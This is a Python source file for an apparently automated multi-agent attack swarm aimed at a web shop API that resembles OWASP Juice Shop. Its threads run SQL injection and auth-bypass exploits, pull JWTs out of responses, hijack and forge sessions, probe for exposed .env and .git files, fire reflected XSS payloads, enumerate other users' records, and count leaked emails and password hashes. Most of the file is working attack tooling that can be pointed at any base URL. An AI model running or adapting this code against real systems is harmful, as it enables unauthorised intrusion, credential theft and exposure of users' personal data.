#!/usr/bin/env python3
import json, time, re, sys, os, random, threading, requests
from datetime import datetime
from queue import Queue
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from nova_adaptive_brain import NovaAdaptiveBrain
from nova_exploit_synthesizer import NovaExploitSynthesizer
from nova_session_hijacker import NovaSessionHijacker
from nova_race_engine import NovaRaceEngine
from nova_jwt_forge import NovaJWTForge
from nova_code_reasoner_v2 import NovaCodeReasoner


class ConcurrentKnowledgeGraph:
    def __init__(self):
        self.lock = threading.RLock()
        self.graph = {"endpoints": {}, "findings": [], "tokens": [], "paths": [], "exposed_data": [], "config_leaks": [], "idor_candidates": [], "xss_reflections": [], "mission_log": []}
        self.agent_status = {}
        self.start_time = time.time()
    
    def add_finding(self, finding):
        with self.lock:
            key = (finding.get("type"), finding.get("endpoint"))
            for f in self.graph["findings"]:
                if (f.get("type"), f.get("endpoint")) == key: return False
            finding["timestamp"] = datetime.now().isoformat()
            self.graph["findings"].append(finding)
            return True
    
    def add_token(self, token, source, agent):
        with self.lock:
            if token not in [t.get("token") for t in self.graph["tokens"]]:
                self.graph["tokens"].append({"token": token, "source": source, "agent": agent})
                return True
        return False
    
    def add_path(self, path, agent):
        with self.lock:
            if path not in self.graph["paths"]: self.graph["paths"].append(path); return True
        return False
    
    def add_endpoint(self, ep, profile):
        with self.lock: self.graph["endpoints"][ep] = profile
    
    def add_exposed_data(self, data):
        with self.lock: self.graph["exposed_data"].append(data)
    
    def add_config_leak(self, config):
        with self.lock: self.graph["config_leaks"].append(config)
    
    def add_idor_candidate(self, c):
        with self.lock: self.graph["idor_candidates"].append(c)
    
    def add_xss_reflection(self, r):
        with self.lock: self.graph["xss_reflections"].append(r)
    
    def log(self, agent, msg):
        with self.lock:
            entry = f"[{datetime.now().strftime('%H:%M:%S')}] [{agent}] {msg}"
            self.graph["mission_log"].append(entry)
            print(f"  {entry}")
    
    def get_tokens(self):
        with self.lock: return list(self.graph["tokens"])
    
    def get_paths(self):
        with self.lock: return list(self.graph["paths"])
    
    def get_endpoints(self):
        with self.lock: return dict(self.graph["endpoints"])
    
    def get_stats(self):
        with self.lock:
            return {"endpoints": len(self.graph["endpoints"]), "findings": len(self.graph["findings"]), "tokens": len(self.graph["tokens"]), "paths": len(self.graph["paths"]), "exposed_data": len(self.graph["exposed_data"]), "config_leaks": len(self.graph["config_leaks"]), "idor_candidates": len(self.graph["idor_candidates"]), "xss_reflections": len(self.graph["xss_reflections"]), "elapsed": round(time.time() - self.start_time, 1)}
    
    def save(self, filename="nova_parallel_swarm_report.json"):
        with self.lock:
            stats = self.get_stats()
            findings = self.graph["findings"]
            critical = [f for f in findings if f.get("severity") == "critical"]
            high = [f for f in findings if f.get("severity") == "high"]
            report = {"timestamp": datetime.now().isoformat(), "stats": stats, "critical_count": len(critical), "high_count": len(high), "total_findings": len(findings), "findings": findings, "tokens": [t["token"][:50] + "..." for t in self.graph["tokens"]], "paths": self.graph["paths"]}
            with open(filename, "w") as f: json.dump(report, f, indent=2, default=str)


class ReconAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="ReconAgent")
        self.kg = kg; self.base_url = base_url
        self.brain = NovaAdaptiveBrain(base_url=base_url)
    
    def run(self):
        self.kg.log(self.name, "🟢 Mapping attack surface")
        endpoints = ["/rest/products/search", "/rest/user/login", "/rest/user/register", "/rest/user/whoami", "/api/Feedbacks", "/api/Users", "/rest/admin/application-configuration", "/rest/order-history", "/file-serving", "/rest/basket/1", "/.git/config", "/robots.txt", "/.env", "/debug", "/api/Challenges", "/rest/user/security-question"]
        for ep in endpoints:
            try:
                profile = self.brain.profile_endpoint(ep)
                self.kg.add_endpoint(ep, profile)
                if profile.get("attack_surface_rating") in ["CRITICAL", "HIGH"]:
                    self.kg.log(self.name, f"🎯 {ep} → {profile.get('attack_surface_rating')}")
                for key, val in profile.get("behavior", {}).items():
                    for p in re.findall(r'(/[\w/.-]+\.[\w]{1,6})', str(val)):
                        if len(p) > 10: self.kg.add_path(p, self.name)
                if profile.get("behavior", {}).get("leaks_path"):
                    self.kg.add_config_leak({"endpoint": ep})
            except: pass
            time.sleep(0.05)
        self.kg.log(self.name, f"Mapped {len(self.kg.get_endpoints())} endpoints")


class ExploitAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="ExploitAgent")
        self.kg = kg; self.base_url = base_url
        self.synth = NovaExploitSynthesizer(base_url=base_url)
    
    def run(self):
        self.kg.log(self.name, "🔴 Exploiting targets")
        time.sleep(3)
        targets = self.kg.get_endpoints()
        priority = [ep for ep, p in targets.items() if p.get("attack_surface_rating") in ["CRITICAL", "HIGH"]]
        for ep in priority[:5]:
            profile = targets[ep]
            leaks = profile.get("behavior", {})
            sink = "sql_injection" if leaks.get("leaks_sql") or leaks.get("leaks_stack") else "auth_bypass"
            method = "POST" if any(k in ep for k in ["login", "register"]) else "GET"
            params = ["email", "password"] if method == "POST" else ["q"]
            self.kg.log(self.name, f"Attacking {ep}")
            self.synth.exploit_path(path=[{"endpoint": ep, "method": method, "params": params}], sink_type=sink, confidence="HIGH")
            for r in self.synth.results:
                if r.get("success") == True:
                    ind = r.get("indicators_found", [])
                    sev = "critical" if any(i in ind for i in ["password", "admin", "token"]) else "high"
                    self.kg.add_finding({"type": r.get("exploit_type", "sql_injection"), "endpoint": ep, "data_exposed": ind[:5], "severity": sev, "agent": self.name})
                    preview = r.get("response_preview", "")
                    for tok in re.findall(r'(eyJ[A-Za-z0-9\-._~+/]{20,}=*)', preview):
                        self.kg.add_token(tok, ep, self.name)
                    for p in re.findall(r'(/[\w/.-]+\.[\w]{1,6})', preview):
                        if len(p) > 10: self.kg.add_path(p, self.name)
            time.sleep(0.3)
        self.kg.log(self.name, "Exploit phase complete")


class AuthAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="AuthAgent")
        self.kg = kg; self.base_url = base_url
    
    def run(self):
        self.kg.log(self.name, "🟣 Waiting for tokens")
        while True:
            tokens = self.kg.get_tokens()
            if tokens:
                token = tokens[0]["token"]
                self.kg.log(self.name, "Escalating with token")
                hijacker = NovaSessionHijacker(base_url=self.base_url)
                r = hijacker.run_full_hijack(initial_token=token)
                if r.get("fixation_results", [{}])[0].get("success"):
                    self.kg.add_finding({"type": "session_fixation", "endpoint": "/", "severity": "medium", "agent": self.name})
                forge = NovaJWTForge(base_url=self.base_url)
                jr = forge.run_full_forge(token)
                if jr.get("successful_forgeries"):
                    self.kg.add_finding({"type": "jwt_forgery", "severity": "critical", "agent": self.name})
                break
            time.sleep(1)
        self.kg.log(self.name, "Auth complete")


class CodeAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="CodeAgent")
        self.kg = kg; self.base_url = base_url
    
    def run(self):
        self.kg.log(self.name, "💜 Analyzing source")
        time.sleep(5)
        paths = self.kg.get_paths()
        if len(paths) >= 3:
            reasoner = NovaCodeReasoner(base_url=self.base_url)
            report = reasoner.run_full_analysis(leaked_paths=paths[:15])
            for f in report.get("findings", []):
                self.kg.add_finding({"type": f["vulnerability_type"], "endpoint": f["endpoint"], "source_file": f.get("source_file", ""), "source_line": f.get("source_line", 0), "severity": "high", "agent": self.name})
        self.kg.log(self.name, "Code analysis done")


class RaceAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="RaceAgent")
        self.kg = kg; self.base_url = base_url
    
    def run(self):
        self.kg.log(self.name, "🟠 Race conditions")
        tokens = self.kg.get_tokens()
        token = tokens[0]["token"] if tokens else None
        racer = NovaRaceEngine(base_url=self.base_url)
        report = racer.run_full_race_suite(auth_token=token)
        for a in report.get("attacks", []):
            if a.get("vulnerable"):
                self.kg.add_finding({"type": a.get("attack_type", "race"), "endpoint": "/rest/products/search", "severity": "high", "agent": self.name})
        self.kg.log(self.name, "Race done")


class ConfigAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="ConfigAgent")
        self.kg = kg; self.base_url = base_url
        self.s = requests.Session()
    
    def run(self):
        self.kg.log(self.name, "⚙️ Config scan")
        for ep in ["/.env", "/.git/config", "/config.yml", "/package.json", "/debug", "/api-docs", "/robots.txt", "/.well-known/security.txt"]:
            try:
                resp = self.s.get(f"{self.base_url}{ep}", timeout=5)
                if resp.status_code in [200, 403]:
                    sensitive = any(k in resp.text.lower() for k in ["password", "secret", "key", "token", "config"])
                    self.kg.add_finding({"type": "config_exposure", "endpoint": ep, "status": resp.status_code, "severity": "high" if sensitive else "medium", "agent": self.name})
                    if resp.status_code == 200: self.kg.log(self.name, f"Found {ep} ({len(resp.text)} bytes)")
            except: pass
            time.sleep(0.05)
        self.kg.log(self.name, "Config done")


class XSSAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="XSSAgent")
        self.kg = kg; self.base_url = base_url
        self.s = requests.Session()
    
    def run(self):
        self.kg.log(self.name, "💚 XSS hunt")
        time.sleep(4)
        for ep, profile in self.kg.get_endpoints().items():
            for param in profile.get("reflected_params", [])[:1]:
                for payload in ["<script>alert('NOVA')</script>", "<img src=x onerror=alert(1)>"]:
                    try:
                        resp = self.s.get(f"{self.base_url}{ep}", params={param: payload}, timeout=5)
                        if payload in resp.text:
                            self.kg.add_finding({"type": "xss_reflected", "endpoint": ep, "parameter": param, "severity": "high", "agent": self.name})
                            self.kg.log(self.name, f"🔥 XSS on {ep}")
                            break
                    except: pass
                    time.sleep(0.03)
        self.kg.log(self.name, "XSS done")


class IDORAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="IDORAgent")
        self.kg = kg; self.base_url = base_url
        self.s = requests.Session()
    
    def run(self):
        self.kg.log(self.name, "💛 IDOR hunt")
        time.sleep(6)
        tokens = self.kg.get_tokens()
        if tokens: self.s.headers["Authorization"] = f"Bearer {tokens[0]['token']}"
        for uid in range(1, 8):
            for ep in ["/rest/basket/{id}", "/api/Users/{id}"]:
                try:
                    resp = self.s.get(f"{self.base_url}{ep.replace('{id}', str(uid))}", timeout=5)
                    if resp.status_code == 200 and len(resp.text) > 50:
                        self.kg.add_idor_candidate({"endpoint": ep, "user_id": uid})
                        if uid > 1:
                            self.kg.add_finding({"type": "idor", "endpoint": ep, "user_id": uid, "severity": "high", "agent": self.name})
                            self.kg.log(self.name, f"🔥 IDOR user {uid}")
                            break
                except: pass
                time.sleep(0.03)
        self.kg.log(self.name, "IDOR done")


class ExfilAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="ExfilAgent")
        self.kg = kg; self.base_url = base_url
        self.s = requests.Session()
    
    def run(self):
        self.kg.log(self.name, "💗 Data catalog")
        time.sleep(8)
        tokens = self.kg.get_tokens()
        if tokens: self.s.headers["Authorization"] = f"Bearer {tokens[0]['token']}"
        for ep in ["/api/Users", "/api/Feedbacks", "/rest/admin/application-configuration"]:
            try:
                resp = self.s.get(f"{self.base_url}{ep}", timeout=10)
                if resp.status_code == 200:
                    emails = len(re.findall(r'"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"', resp.text))
                    hashes = len(re.findall(r'"[a-f0-9]{32,128}"', resp.text))
                    if emails or hashes:
                        self.kg.add_exposed_data({"endpoint": ep, "emails": emails, "hashes": hashes})
                        self.kg.log(self.name, f"📦 {ep}: {emails} emails, {hashes} hashes")
                        self.kg.add_finding({"type": "data_exposure", "endpoint": ep, "count": emails, "severity": "critical", "agent": self.name})
            except: pass
            time.sleep(0.1)
        self.kg.log(self.name, "Data catalog done")


class ValidateAgent(threading.Thread):
    def __init__(self, kg, base_url):
        super().__init__(daemon=True, name="ValidateAgent")
        self.kg = kg; self.base_url = base_url
    
    def run(self):
        time.sleep(20)
        self.kg.log(self.name, "Final validation")
        findings = self.kg.graph["findings"]
        critical = [f for f in findings if f.get("severity") == "critical"]
        high = [f for f in findings if f.get("severity") == "high"]
        stats = self.kg.get_stats()
        print(f"""
╔══════════════════════════════════════════════╗
║   🦅 NOVA PARALLEL SWARM — COMPLETE        ║
╠══════════════════════════════════════════════╣
║  Time: {stats['elapsed']:.1f}s  |  Agents: 10              ║
║  Endpoints: {stats['endpoints']}  |  Findings: {len(findings)}  |  Crit: {len(critical)}  High: {len(high)}  ║
║  Tokens: {stats['tokens']}  |  Paths: {stats['paths']}  |  IDORs: {stats['idor_candidates']}     ║
║  Config: {stats['config_leaks']}  |  XSS: {stats['xss_reflections']}  |  Data: {stats['exposed_data']}      ║
╚══════════════════════════════════════════════╝""")
        if critical:
            print("🔥 CRITICAL:")
            for f in critical: print(f"   💀 [{f['agent']}] {f['type']}: {f.get('endpoint', '?')}")
        if high:
            print("⚠️  HIGH:")
            for f in high: print(f"   ⚡ [{f['agent']}] {f['type']}: {f.get('endpoint', '?')}")
        self.kg.save()
        print(f"\n📁 Report: nova_parallel_swarm_report.json")
